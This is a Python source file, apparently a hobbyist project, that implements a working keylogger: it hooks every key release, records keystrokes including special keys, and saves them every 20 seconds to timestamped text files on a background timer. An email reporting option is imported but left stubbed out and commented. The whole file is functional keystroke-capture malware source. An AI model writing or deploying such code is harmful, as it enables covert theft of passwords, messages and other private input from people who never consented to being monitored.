import keyboard # for capturing keylogs
import smtplib # for sending email using smtp protocol
from threading import Timer # for ofcourse timer purpose
from datetime import datetime

send_report = 20 

class keylogger :
    def __init__(self, interval ,report_method = "file") :

        print("here")
        self.interval = interval  #the time intervals
        self.report_method = report_method # the report sending medium

        self.log = "" #the actual logs to report i.e, the key reports

        self.start_date = datetime.now()
        self.end_date = datetime.now()

    def callback(self,event) :
        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a key is released in this example)
        """
        name = event.name
        print("here2")

        if len(name) > 1 :

            # not a character, special key (e.g - ctrl, alt, etc.)
            # uppercase with []
            if name == "space" :
                # will put " " instead of "space" in the log
                name = " "

            elif name == "enter" :

                name = "[ENTER]\n"
            
            elif name =="decimal" :
                
                name = "."

            else :
                #replacing spaces with '_'
                name = name.replace(" ","_")
                name = f"[{name.upper()}]"
        
        self.log += name

    def update_filename(self) :

        #constructing the filenames everytime
        start_dt_str = str(self.start_date)[:-7].replace(" ","-").replace(":","")
        end_dt_str = str(self.end_date)[:-7].replace(" ","-").replace(":","")
        self.filename= f"keylog-{start_dt_str}-{end_dt_str}"

    def report_to_file(self) :

        #"This will create a file and store the keylogs into it and hence the process further"
        with open (f"{self.filename}.txt",'w') as fi :
            print(self.log,file=fi)
        
        print (f" Saved {self.filename}.txt")

    def report(self) :

        """ 
            this function get called for every self.interval 
            it basically saves keylogs and resets 'self.log' variable
        """
        print('in the report')
        print(f"length of log is : {len(self.log)}")
        if self.log :
            # if there is something to report, do it mann !!!
            print("somthing to log")
            
            self.end_date = datetime.now()

            self.update_filename() # assigning the file name to the file

            if self.report_method == "email" :
                
                #self.sendmail(emai_address,email_pass,self.log)
                pass
            
            elif self.report_method == "file" :
                
                 self.report_to_file()

            else :
                pass

            self.start_date = datetime.now()

        self.log = ""

        timer = Timer(interval = self.interval, function= self.report)

            #setting the thread as daemon (dies when the main thread dies)

        timer.daemon = True

            # start the timer
        timer.start()
        
    def start(self) :

        #record the start datetime
        self.start_date = datetime.now()

        #startng the keylogger

        keyboard.on_release(callback=self.callback)

        #start reporting the keylogger
        self.report()
        print("after report")

        print("started the keylogger")

        #block the current thread , wait until ctrl+c is pressed 

        keyboard.wait()

if __name__=="__main__" :

    keylog= keylogger(interval=send_report, report_method="file")
    keylog.start()





        
        